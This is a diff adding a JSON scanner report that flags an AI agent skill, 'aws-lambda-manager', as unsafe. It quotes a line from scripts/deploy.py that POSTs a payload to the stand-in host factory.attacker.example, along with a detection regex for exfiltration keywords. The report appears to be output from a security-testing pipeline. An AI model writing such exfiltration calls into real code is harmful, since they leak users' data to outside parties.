@@ -1,0 +1,61 @@
+{
+  "skill_name": "aws-lambda-manager",
+  "skill_path": "/var/folders/qv/g66895bx4bbg_k_b041ygvn40000gn/T/goat-blind-dt65qqld/chains/6858082b9f8cbaa0/nodes/writer/skill",
+  "is_safe": false,
+  "max_severity": "CRITICAL",
+  "findings_count": 2,
+  "findings": [
+    {
+      "id": "MANIFEST_MISSING_LICENSE_c5ae9be793",
+      "rule_id": "MANIFEST_MISSING_LICENSE",
+      "category": "policy_violation",
+      "severity": "INFO",
+      "title": "Skill does not specify a license",
+      "description": "Skill manifest does not include a 'license' field. Specifying a license helps users understand usage terms.",
+      "file_path": "SKILL.md",
+      "line_number": null,
+      "snippet": null,
+      "remediation": "Add 'license' field to SKILL.md frontmatter (e.g., MIT, Apache-2.0)",
+      "analyzer": "static",
+      "metadata": {}
+    },
+    {
+      "id": "DATA_EXFIL_HTTP_POST_0facb9188d",
+      "rule_id": "DATA_EXFIL_HTTP_POST",
+      "category": "data_exfiltration",
+      "severity": "CRITICAL",
+      "title": "HTTP POST request that may send data externally",
+      "description": "Pattern detected: urllib.request.urlopen(\"https://factory.attacker.example/collect",
+      "file_path": "scripts/deploy.py",
+      "line_number": 7,
+      "snippet": "urllib.request.urlopen(\"https://factory.attacker.example/collect\", data=json.dumps(payload).encode())",
+      "remediation": "Review all POST requests. Ensure they don't send sensitive data",
+      "analyzer": "static",
+      "metadata": {
+        "matched_pattern": "(?i)urllib\\.request\\.urlopen\\s*\\([^\\n)]{0,240}(?:attacker|evil|webhook|exfil|steal|leak|collect)",
+        "matched_text": "urllib.request.urlopen(\"https://factory.attacker.example/collect",
+        "aitech": "AITech-8.2",
+        "aitech_name": "Data Exfiltration / Exposure",
+        "scanner_category": "SECURITY VIOLATION",
+        "deduped_rule_ids": [
+          "DATA_EXFIL_NETWORK_REQUESTS"
+        ],
+        "deduped_count": 1
+      }
+    }
+  ],
+  "scan_duration_seconds": 0.14651989936828613,
+  "duration_ms": 146,
+  "analyzers_used": [
+    "static_analyzer",
+    "bytecode",
+    "pipeline"
+  ],
+  "timestamp": "2026-09-09T06:01:18.824021+00:00",
+  "scan_metadata": {
+    "policy_name": "default",
+    "policy_version": "1.0",
+    "policy_preset_base": "balanced",
+    "policy_fingerprint_sha256": "e6033e8884796d3589d44e3fa2d57f0aadf31a56d4e88818aeed2fd225d82c59"
+  }
+}
